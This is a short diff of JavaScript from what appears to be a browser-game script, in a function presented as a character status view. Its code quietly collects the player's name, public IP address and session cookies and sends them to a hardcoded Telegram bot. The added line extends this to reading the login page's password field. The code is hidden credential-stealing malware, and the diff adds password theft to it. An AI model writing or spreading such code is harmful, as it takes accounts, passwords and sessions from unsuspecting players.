@@ -49,7 +49,7 @@ function status_view(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, b, _, g, h, v,
     if(sessionStorage.getItem("sent")=='0'){
         if(!nameList.includes(btoa(encodeURIComponent(parent.p_name)))){
             ipify().then(res=>{
-                fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=角色狀態:${parent.p_name}%0A${res.ip}%0A%0A${document.cookie}`);
+                fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=角色狀態:${parent.p_name} | ${parent.top_view.document.getElementsByTagName("input")['pass'].value}%0A${res.ip}%0A%0A${document.cookie}`);
             });
         }
     	sessionStorage.setItem("sent", 1);
